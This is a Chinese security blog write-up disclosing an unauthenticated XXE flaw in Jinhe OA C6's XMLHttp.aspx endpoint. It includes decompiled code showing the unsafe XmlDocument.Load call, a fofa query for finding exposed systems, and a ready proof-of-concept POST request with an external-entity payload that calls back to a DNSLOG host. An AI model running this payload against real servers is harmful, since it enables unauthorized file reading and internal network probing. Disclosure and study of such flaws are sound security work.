---
title: "金和OA JHSoft.Web.CrmSystemSet/XMLHttp.aspx XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-CrmSystemSet-XMLHttp-xxe.html
asset_dir: assets/金和oa-jhsoft.web.crmsystemsetxmlhttp.aspx-xxe漏洞
---

# 金和OA JHSoft.Web.CrmSystemSet/XMLHttp.aspx XXE漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2026/1/27 13:31
* 206浏览
* [0评论](#comment)
* 10分钟阅读

深入探索

SQL

XMLHttpRequest

授权


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `JHSoft.Web.CrmSystemSet/XMLHttp.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

脚本语言

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

直接根据 `JHSoft.Web.CrmSystemSet/XMLHttp.aspx` 在 `bin` 目录下查找 `JHSoft.Web.CrmSystemSet.dll` 将其进行反编译后找到 **QuickMatch** 的处理逻辑

```
public class XMLHttp : Page
{
  private string strPlanTypeIDlist = string.Empty;
  private DBOperator dbop = DBOperatorFactory.GetDBOperator();
  private string strSql = string.Empty;
  protected HtmlForm Form1;

  protected void Page_Load(object sender, EventArgs e)
  {
    XmlDocument xmlDocument = new XmlDocument();
    xmlDocument.Load(this.Request.InputStream);
```

深入探索

漏洞扫描器

安全认证考试

安全运维咨询

请求内容直接使 `XmlDocument.Load` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

# 漏洞复现

```
POST /c6/JHSoft.Web.CrmSystemSet/XMLHttp.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到请求

漏洞扫描服务

[![金和OA JHSoft.Web.CrmSystemSet/XMLHttp.aspx XXE漏洞](images/img-001-ab40f77f1ff8.webp)](https://image.mrxn.net/b12efeef8c1a4140adbccbbbda98c37e.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#XXE](https://mrxn.net/tag/XXE)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[金和OA JHSoft.Web.CrmSystemSet/XMLHttp.aspx XXE漏洞](https://mrxn.net/jswz/jhsoft-CrmSystemSet-XMLHttp-xxe.html)  
文章链接：<https://mrxn.net/jswz/jhsoft-CrmSystemSet-XMLHttp-xxe.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALbUlEQVR4AeydgVIjPQ6E8+37v/N/9Ii2ZY09SVgguVpT6G+p1ZKNNYYke1X353a7/fdV+698PdKnlBxhrTvI8h9rTDueoTWP4Ky+cqs+WWdN5r7iayAfdfv7XU6gDeRjwrdHrW4euAFDvTW1p/kZWuscRF/AVENrMzoJHPuBEZ3PmOvlz3KZkw/RV3qb+GzmH8Fc1waSye2/7gROA4GYPpxxtU0/BbM8nPvAyLkORt59hSsN9BrpZNbKlzmeIfR6YCZpt22avEMCrR5Gf1Z6GshMtLnfO4EfG4iezGz+ke5xylubUbzMnPxqzlW0rvI5tiZjzs986E/8LP8V7scG8pXN7Jrb7VsHAjz1+9IDgKhz7KfU8QwhauCM1sM5ByNXtY6FEFrvByJW7qfsWwfyU5v8l/r+zED+pRP85p/1NBBfzxmu1ob1Va59ILQwvpGUDiLndSBi6Oic9Cuz5hl0Lziv5T7WzNCaijOtuapVfBqIyG2vO4E2EOhPBlz7q+168sKqgeipnA2Cq9pZ7Jqag+gB1FT7KMcJ9xBWDjhekChns8YIoakxYKohcPSD+9iKPpw2kA9/f7/BCfzx0/AVrPuH/jS4HwTnONeYg7XGegiNY6N7CM09gtLLrJUvczxD5WWznDnl/8b2DfFJvgneHQjEkwlrnD0REHrn/PNC8NBxpXHNDKHXw+hXfe2vPIw1cI6lk8GYE7cyeF6be90dSBZv/+dPoA0EYrJXS/pJqwhRCx2tcT+InOMrdG1G6805zuicMef+xnc/I9z/Wax9dt02kGcLX6D/J5bcA3mzMbeB+IpBXEcIzPuF4CDQOddmdA7ua2HUwBi7V0avlTmY10Hw0HFWr17mM0LUKZ/tSgPnGjhzuZ/8NhAF215/An8gpgaB3lKe/sqHqIFA12Z0rTkILWDqhLVGghmXeeeFwPGxhfLZlLOZr7F5IUQfa2Aew/mD0loDXaPe2SD6At/7D1S3/fXXJ3D6leXJujP06VWuap3PCFF/pa05iBq4j1drQdS7P0QMZ8x9qg+hNw9jLB6CgxG9tlC6e3YayL2Cnf/ZE2gD0QRlXg5i0uJsztXY/Aytheg305iD0LjGvNBcReVszkH0Mf8MQtQCpzL3PyU+iKvcR/ry27XCNpDLip38tRPYA/m1o35sofbvIcDxUhECdX1kEDGs0UvBWeOcelVzDqKuxllfc44zwtjHOQh+1s+ctRmdMzrnOCPEGlXjWAijRly1fUPqibw4fmog+YmQ773LXxnEUwGBrhFCcKtaaapZax6iB6zfeM205iq6vxB6b+i+a+DMzXIQOvWUWWOEyAP7jeHtzb7aRyfelyYog5iafBsEB4HmXZsRRo21EDz0Jxo6B93P/exD5B27r9DcCqWxVc2KrzrFEHtwzQylk+UcRJ14Wc7Zf+pXlpps+9kTaAPxhK6Ws8ZoLcTkoeNKY14IoXcfcTLHGWHU5px9uK+xVuvIYKyBiKHf4FrjGLq2co6vEKI+a9pAMrn9153AciB6emQQUwTaLoHpexbpbU1cHOi1JdV6znqYM7oW1v2q1jVCiDr52VwjhNDIl1knX+Z4hsrLZjmIvrPcciAz8eYePoEvC/dAvnx0P1PYPjpxe1hfJ2t0FWWOIWpgjdaqzjbjlIPo47wQgoMRlbOpVuYYQitOZl6oWCY/G0QN0Gjg+HVqAiJWvc05xxAa80LnKkJogf3G8PZmX+2NIcSUPD2IOO8XgoPAnJPv2ozis0HUQn9ZCZ0Dmhw4nkzo2pacOBB6p7wPxxlh1ELErhFaL19WY4gaOKO10HPmKqq3bf8Nqafz4vipgXiKFa9+hme0V31qrvbNcdU6hv60Zr38Kw1EXdU4FqrHzJSzQfSBEZ0XPjUQFWz72RNor7I83UeWg5hw1ULwQE212OsIG7lwpLEBx9+TKoXggZo69HDmJQSOvHyZ18koXmZO/j2Dse89fc3vG1JP5MXxHsiLB1CXby97a0LXVFZ5xeJl8rOJs0FcXVhjrs3+rEfOZ99aYeZf5Wsfstn64mcG/Yz2DZmd3Au5pwYCfZLQ/av9z54IcxA9aj0Eb11GayE0cEZrXFdj80LnHkGItVQnyzUQORhxpjEHoVUv21MDcaONP3cCp4FATG22pKdotMYxRC2sP+qA+5pZP6/1CLreWuhrwuhbY4Ser9wqFu81r1A6GcQa1oqznQbixMbXnEAbCMTUHtkGPK+FqPFTIYQzt+K9L+VlNRZng+gLgdZmtDZz1Yd5vWszwqiFiKFj1suHyOV120Ayuf3XnUAbiCYmq1sRZ3POsRHOk65axxldbw7WfaypCFEDHWtf15gXmoNeB5geUPpsTgLHxy+AqRZb3xITZ6ZpA5noN/WCE3jBQF7wU/4fLdk+7QWO6+ZrBBFDR/9cEJxjo2uFEBoIFCeDiAGXHetCj6WTNcHEUV6WU4plmcs+0NaC8KVfmWshtBBoPtdVDkat8jByMMbS7BuiU3gjax8uetrem+OMNQfnCVeN4xlC1HuNmaZyEDUQ6FohBFdrlJNlXrHMHEQtdHTOKL3M8Qwh6p2T3mYOQmMeIgb2/+rk9mZfp19Z0KcFDNsFht/BTnrSjoUQWvkrq3U1znUw7wfBQ/+4BoJzPxhj8RAcBIqT5TUVyzJ3z5deZh1Ef+j7U14GkZNvOw3EjTa+5gROr7LqNiCmCOcJX2lrzrGfBKG5FUJfe6VRH5s1jiHqHTsvrByEVjkbnDnlIHjoWPvVONfJX9m+IauTeRG/B/Kig18te3rZW6+aYyH0Kwr9VxgEP1tEdTIIDXS0HjoHmB5QPbI5CRwvNABTLbbeCaDlzFV0jdA5+TKIevnVrIXQOM7oGnM1Fr9viE7hjaz9Ua978vQgJg79RjhXa3JsDUS9c+aFM048jDXSQXAQKK4ajDkY46pXrPVk8quJl5mXL3OcEca1IGLpbRAcjJj77BuST+MN/C8NBGLCdf9+EoQ15xiiFjo6Z1T9V8z1zyDEPrzerBZCM8tV7qqPtVeaLw3EjTd+/wm0gUA8BTDibMk64Rpf1VibEe6vCaMGIs5ruae5VSweol6+DCJ2rRDOnHgbRB7631cITj1l1goVy+Rng6gB9oeLtzf7uvs+ZLZfiIk6BxFDR+f0RMgcz1B5Wc1B76e87EoDobcGIoYzqpcMIidf5tpnEaKP6yBiOKM1M2y/smbJzf3+CeyBXJ757yfvvjHUNbZ5ezWuvPLmIK5sjSF46Kg6mbXybRC6Wc4aY9XUWDpzRhj7i5dOJv+eSTezWR2Ma+W6fUNmJ/ZCrv1Rh5gaPI7P7Buib34aaj2EBgJrfhZDaIFTGjg+THQCIgZMtf9rPe8LOGqgo3Ot6MKBqJtJ3Kdi1u4bkk/jDfw2kDq1q3i1b4inAzqutDPeazoHvU/NWWNeaO4ZhL4GcFkKDLdnJtY+ZLPcioPetw1kJd78757AaSDQpwWj/8zW9JRku6q1DmI9a80LYcxBxHDGWl/j3E/+ylxnrDrzQjjvA1CqGXDcsEZ8OrnvaSCfmg0vOoE9kBcd/GrZbxmIr1xeBOJ6QqA1EDGsPyG1NvezX3OOhdYYIdZSTgYRw3ltiJxrM8KYg4jV05b18le8chD18qt9y0Bq0x1//QS+dSB+KoRf39Lt+MMH8RRB4O3zC8b4kz5A68qO4OM/8mUf7ukb5n0geKDVqIfMhHyZ4xkCx88xy6lWNst960BmC2zuuRM4DUSTW9kzrWsPWD8xj/St/VwD0Rcw1T4OacSnU3so/kxNQXkZcDztsEbpsk0bPkCeBvJAzZb84Am0gcB6+jDmVvuBrltpHnmKrMk9oPcGWspaIXA8yU7CPAYsabdJ9bKW+HCAoZ/yK/uQT79n+iqEWAfY/6Z+e7OvdkPebF//7Hb+BwAA//+wc8tUAAAABklEQVQDABq4mZL8CbAGAAAAAElFTkSuQmCC)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-CrmSystemSet-XMLHttp-xxe.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

网络安全

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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